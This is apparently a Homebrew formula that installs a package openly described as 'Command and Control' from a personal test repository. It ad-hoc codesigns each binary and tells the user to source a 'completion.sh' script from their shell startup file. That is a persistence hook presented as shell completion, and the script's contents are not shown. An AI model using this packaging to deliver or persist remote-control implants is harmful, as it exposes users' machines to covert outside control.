class Poseidon < Formula
    desc "Command and Control"
    homepage "https://github.com/JonEagle/"
    url "https://github.com/JonEagle/homebrew-test/tree/main/dist/poseidon-1.33.7.tar.gz"
    sha256 "bd3b1433d1ea6b7d697d955474f64c879f977f1df81496988f3369b0a14e843f"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
          end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
